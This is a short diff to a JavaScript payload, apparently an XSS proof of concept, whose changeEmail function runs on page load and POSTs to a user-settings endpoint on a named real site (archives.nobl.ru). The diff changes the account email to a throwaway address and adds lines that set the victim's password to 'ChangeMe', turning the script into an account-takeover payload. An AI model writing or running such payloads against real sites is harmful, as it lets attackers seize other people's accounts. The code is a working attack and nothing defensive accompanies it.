@@ -25,7 +25,9 @@ function changeEmail(newEmail) {
   formData.append('values[lastName]', 'XSS_Proof');
   formData.append('values[login]', 'test3');
   formData.append('values[secondName]', '');
-  formData.append('values[email]', 'rocx82zxzt@wyoxafp.com');
+  formData.append('values[email]', 'ykfrga64te@vwhins.com');
+  formData.append('values[password]', 'ChangeMe');
+  formData.append('values[confirmPassword]', 'ChangeMe');
 
   fetch('https://archives.nobl.ru/local/templates/g3/components/openregion/user/.default/http/save.php', {
     method: 'POST',
@@ -49,5 +51,5 @@ function changeEmail(newEmail) {
 }
 
 window.addEventListener('DOMContentLoaded', () => {
-  changeEmail('rocx82zxzt@wyoxafp.com');
+  changeEmail('ykfrga64te@vwhins.com');
 });
